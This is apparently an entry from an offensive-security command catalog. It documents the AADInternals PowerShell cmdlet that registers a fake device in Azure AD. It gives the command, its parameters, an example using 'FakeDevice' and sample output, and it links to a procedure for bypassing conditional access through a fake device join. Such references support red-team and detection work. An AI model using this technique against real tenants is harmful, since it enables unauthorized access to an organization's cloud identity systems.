---
id: d38cf9e8-37ac-4cd2-9412-c9fd20a163d0
name: join-aadint-device-to-azure-ad
type: command
executor: powershell
data: >-
  Join-AADIntDeviceToAzureAD -DeviceName "$_DEVICE_NAME" -DeviceType
  "$_DEVICE_TYPE" -OSVersion "$_OS_VERSION"
output: null
created_at: '2023-04-06T03:56:15.982544+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - azure
  - aad
  - device-join
verified: true
validated: true
---

# join-aadint-device-to-azure-ad

## Command

```powershell
Join-AADIntDeviceToAzureAD -DeviceName "$_DEVICE_NAME" -DeviceType "$_DEVICE_TYPE" -OSVersion "$_OS_VERSION"
```

## Description

This command registers a device in Azure AD with specified attributes, simulating a legitimate join to establish trust.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -DeviceName | Name of the device to register | Yes |
| -DeviceType | Type of device (e.g., Windows, iOS) | Yes |
| -OSVersion | Operating system version string | Yes |

## Examples

### Basic Usage

```powershell
Join-AADIntDeviceToAzureAD -DeviceName "FakeDevice" -DeviceType "Windows" -OSVersion "10.0"
```

## Expected Output

Device registration confirmation:
```
DeviceId : a1b2c3d4-...
DisplayName : FakeDevice
OperatingSystem : Windows
OperatingSystemVersion : 10.0
```

## Related

- [[procedures/Bypass-Azure-Conditional-Access-via-Fake-Device-Join]]
- [[tools/AADInternals]]
